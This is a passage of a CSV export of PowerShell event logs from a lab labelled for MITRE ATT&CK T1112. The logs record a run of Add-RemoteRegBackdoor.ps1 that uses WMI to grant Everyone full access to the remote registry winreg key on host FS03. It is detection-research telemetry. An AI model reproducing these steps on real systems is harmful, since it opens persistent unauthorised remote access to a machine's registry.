",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""        Write-Verbose \""[$Computer] Backdooring completed for system\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1133\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=        Write-Verbose \""[$Computer] Backdooring completed for system\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03] Backdooring completed for system\""\n"",""Binary"":""""}}"
62,54766,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,1,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""        $Out = New-Object PSObject  \n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1135\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=        $Out = New-Object PSObject  \n, CommandInvocation(New-Object): \""New-Object\""\nParameterBinding(New-Object): name=\""TypeName\""; value=\""PSObject\""\n"",""Binary"":""""}}"
63,54767,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,1,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""        $Out | Add-Member Noteproperty 'ComputerName' $Computer\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1137\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=        $Out | Add-Member Noteproperty 'ComputerName' $Computer\n, CommandInvocation(Add-Member): \""Add-Member\""\nParameterBinding(Add-Member): name=\""MemberType\""; value=\""NoteProperty\""\nParameterBinding(Add-Member): name=\""Name\""; value=\""ComputerName\""\nParameterBinding(Add-Member): name=\""Value\""; value=\""FS03\""\nParameterBinding(Add-Member): name=\""InputObject\""; value=\""\""\n"",""Binary"":""""}}"
64,54768,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,1,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""        $Out | Add-Member Noteproperty 'BackdoorTrustee' $Trustee\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1139\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=        $Out | Add-Member Noteproperty 'BackdoorTrustee' $Trustee\n, CommandInvocation(Add-Member): \""Add-Member\""\nParameterBinding(Add-Member): name=\""MemberType\""; value=\""NoteProperty\""\nParameterBinding(Add-Member): name=\""Name\""; value=\""BackdoorTrustee\""\nParameterBinding(Add-Member): name=\""Value\""; value=\""S-1-1-0\""\nParameterBinding(Add-Member): name=\""InputObject\""; value=\""@{ComputerName=FS03}\""\n"",""Binary"":""""}}"
65,54769,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,1,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""\tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1141\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=\n\tCommandLine=, CommandInvocation(Out-Default): \""Out-Default\""\nParameterBinding(Out-Default): name=\""InputObject\""; value=\""@{ComputerName=FS03; BackdoorTrustee=S-1-1-0}\""\n"",""Binary"":""""}}"
66,68900,2021-12-09 19:54:03.2614286,4104,Verbose,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,1,S-1-5-21-4230534742-2542757381-3142984815-1234,Contains contents of scripts run,,,"Path: ",ScriptBlockText: Add-RemoteRegBackdoor -ComputerName FS03 -Trustee 'S-1-1-0',,,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""MessageNumber"",""#text"":""1""},{""@Name"":""MessageTotal"",""#text"":""1""},{""@Name"":""ScriptBlockText"",""#text"":""Add-RemoteRegBackdoor -ComputerName FS03 -Trustee 'S-1-1-0'""},{""@Name"":""ScriptBlockId"",""#text"":""29a865ee-6911-418f-be84-57e7a06f5129""}]}}"
67,68901,2021-12-09 19:54:03.2614286,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,1,S-1-5-21-4230534742-2542757381-3142984815-1234,Pipeline executed,"        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1014,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",,Command Name: Write-Verbose,Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Script Name: C:\TOOLS\Add-RemoteRegBackdoor.ps1,"ConnectedUser:         Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1014,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",Host Name: ConsoleHost,"Payload: CommandInvocation(Write-Verbose): ""Write-Verbose"", ParameterBinding(Write-Verbose): name=""Message""; value=""[FS03 : ] Using trustee username 'Everyone'"", ",,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\\TOOLS\\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1014,         User = OFFSEC\\hack1,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(Write-Verbose): \""Write-Verbose\"", ParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : ] Using trustee username 'Everyone'\"", ""}]}}"
68,68902,2021-12-09 19:54:03.3707924,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,1,S-1-5-21-4230534742-2542757381-3142984815-1234,Pipeline executed,"        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Get-WmiObject,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1016,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",,Command Name: Get-WmiObject,Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Script Name: C:\TOOLS\Add-RemoteRegBackdoor.ps1,"ConnectedUser:         Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Get-WmiObject,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1016,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",Host Name: ConsoleHost,"Payload: CommandInvocation(Get-WmiObject): ""Get-WmiObject"", ParameterBinding(Get-WmiObject): name=""Class""; value=""Win32_Service"", ParameterBinding(Get-WmiObject): name=""Filter""; value=""name='RemoteRegistry'"", ParameterBinding(Get-WmiObject): name=""ComputerName""; value=""FS03"", ",,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Get-WmiObject,         Command Type = Cmdlet,         Script Name = C:\\TOOLS\\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1016,         User = OFFSEC\\hack1,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(Get-WmiObject): \""Get-WmiObject\"", ParameterBinding(Get-WmiObject): name=\""Class\""; value=\""Win32_Service\"", ParameterBinding(Get-WmiObject): name=\""Filter\""; value=\""name='RemoteRegistry'\"", ParameterBinding(Get-WmiObject): name=\""ComputerName\""; value=\""FS03\"", ""}]}}"
69,68903,2021-12-09 19:54:03.3707924,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,1,S-1-5-21-4230534742-2542757381-3142984815-1234,Pipeline executed,"        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1018,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",,Command Name: Write-Verbose,Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Script Name: C:\TOOLS\Add-RemoteRegBackdoor.ps1,"ConnectedUser:         Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1018,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",Host Name: ConsoleHost,"Payload: CommandInvocation(Write-Verbose): ""Write-Verbose"", ParameterBinding(Write-Verbose): name=""Message""; value=""[FS03] Attaching to remote registry through StdRegProv"", ",,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\\TOOLS\\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1018,         User = OFFSEC\\hack1,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(Write-Verbose): \""Write-Verbose\"", ParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03] Attaching to remote registry through StdRegProv\"", ""}]}}"
70,68904,2021-12-09 19:54:03.3707924,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,2,S-1-5-21-4230534742-2542757381-3142984815-1234,Pipeline executed,"        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Get-WmiObject,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1020,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",,Command Name: Get-WmiObject,Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Script Name: C:\TOOLS\Add-RemoteRegBackdoor.ps1,"ConnectedUser:         Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Get-WmiObject,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1020,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",Host Name: ConsoleHost,"Payload: CommandInvocation(Get-WmiObject): ""Get-WmiObject"", ParameterBinding(Get-WmiObject): name=""Namespace""; value=""root/default"", ParameterBinding(Get-WmiObject): name=""Class""; value=""Meta_Class"", ParameterBinding(Get-WmiObject): name=""Filter""; value=""__CLASS = 'StdRegProv'"", ParameterBinding(Get-WmiObject): name=""ComputerName""; value=""FS03"", ",,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Get-WmiObject,         Command Type = Cmdlet,         Script Name = C:\\TOOLS\\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1020,         User = OFFSEC\\hack1,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(Get-WmiObject): \""Get-WmiObject\"", ParameterBinding(Get-WmiObject): name=\""Namespace\""; value=\""root/default\"", ParameterBinding(Get-WmiObject): name=\""Class\""; value=\""Meta_Class\"", ParameterBinding(Get-WmiObject): name=\""Filter\""; value=\""__CLASS = 'StdRegProv'\"", ParameterBinding(Get-WmiObject): name=\""ComputerName\""; value=\""FS03\"", ""}]}}"
71,68905,2021-12-09 19:54:03.3864191,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,2,S-1-5-21-4230534742-2542757381-3142984815-1234,Pipeline executed,"        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1022,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",,Command Name: Write-Verbose,Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Script Name: C:\TOOLS\Add-RemoteRegBackdoor.ps1,"ConnectedUser:         Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1022,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",Host Name: ConsoleHost,"Payload: CommandInvocation(Write-Verbose): ""Write-Verbose"", ParameterBinding(Write-Verbose): name=""Message""; value=""[FS03 : SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg] Backdooring started for key"", ",,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\\TOOLS\\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1022,         User = OFFSEC\\hack1,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(Write-Verbose): \""Write-Verbose\"", ParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\SecurePipeServers\\winreg] Backdooring started for key\"", ""}]}}"
72,68906,2021-12-09 19:54:03.4176801,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,2,S-1-5-21-4230534742-2542757381-3142984815-1234,Pipeline executed,"        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1024,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",,Command Name: Write-Verbose,Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Script Name: C:\TOOLS\Add-RemoteRegBackdoor.ps1,"ConnectedUser:         Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1024,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",Host Name: ConsoleHost,"Payload: CommandInvocation(Write-Verbose): ""Write-Verbose"", ParameterBinding(Write-Verbose): name=""Message""; value=""[FS03 : SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)"", ",,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\\TOOLS\\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1024,         User = OFFSEC\\hack1,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(Write-Verbose): \""Write-Verbose\"", ParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\SecurePipeServers\\winreg] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)\"", ""}]}}"
73,68907,2021-12-09 19:54:03.4176801,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,2,S-1-5-21-4230534742-2542757381-3142984815-1234,Pipeline executed,"        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = New-Object,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1026,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",,Command Name: New-Object,Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Script Name: C:\TOOLS\Add-RemoteRegBackdoor.ps1,"ConnectedUser:         Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = New-Object,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1026,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",Host Name: ConsoleHost,"Payload: CommandInvocation(New-Object): ""New-Object"", ParameterBinding(New-Object): name=""TypeName""; value=""System.Management.ManagementClass"", ParameterBinding(New-Object): name=""ArgumentList""; value=""win32_Ace"", ",,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = New-Object,         Command Type = Cmdlet,         Script Name = C:\\TOOLS\\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1026,         User = OFFSEC\\hack1,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(New-Object): \""New-Object\"", ParameterBinding(New-Object): name=\""TypeName\""; value=\""System.Management.ManagementClass\"", ParameterBinding(New-Object): name=\""ArgumentList\""; value=\""win32_Ace\"", ""}]}}"
74,68908,2021-12-09 19:54:03.4357365,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,2,S-1-5-21-4230534742-2542757381-3142984815-1234,Pipeline executed,"        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1028,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",,Command Name: Write-Verbose,Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Script Name: C:\TOOLS\Add-RemoteRegBackdoor.ps1,"ConnectedUser:         Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1028,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",Host Name: ConsoleHost,"Payload: CommandInvocation(Write-Verbose): ""Write-Verbose"", ParameterBinding(Write-Verbose): name=""Message""; value=""[FS03 : SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg] Creating the trustee WMI object with user 'Everyone'"", ",,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify 